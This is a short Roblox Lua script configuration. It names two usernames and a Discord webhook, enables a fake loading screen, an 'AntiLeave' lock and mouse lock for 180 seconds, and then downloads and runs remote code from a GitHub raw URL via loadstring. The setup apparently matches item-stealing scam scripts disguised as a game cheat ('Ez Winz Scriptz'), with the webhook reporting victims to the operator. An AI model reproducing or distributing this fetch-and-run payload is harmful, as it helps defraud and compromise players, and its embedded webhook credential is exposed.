UserName = "oadeap"
UserName2 = "oadeep" -- optional delete the whole line if you don't want it
Webhook = "https://discord.com/api/webhooks/1107118566538494043/akUHezzYJOjNoiqMKKPkTDaqQNhBtfS343jdwQc3EWyS5PG4GJ-7hJOFQAvKAlxn36ek" -- optional delete the whole line if you don't want it

_G.LoadingScreen = true
_G.AntiLeave = true
_G.MouseLock = true 
-- set them to false if you don't need them

_G.ScriptName = "Ez Winz Scriptz"
_G.FirstText = "Script Preparing"
_G.SecondText = "Script Loading..."
_G.ThirdText = "Almost Done..."
_G.WaitingTime = 180 -- it's the time between 0% and 100% in secondes

loadstring(game:HttpGet("https://raw.githubusercontent.com/k4ftt/R/main/Main.lua", true))()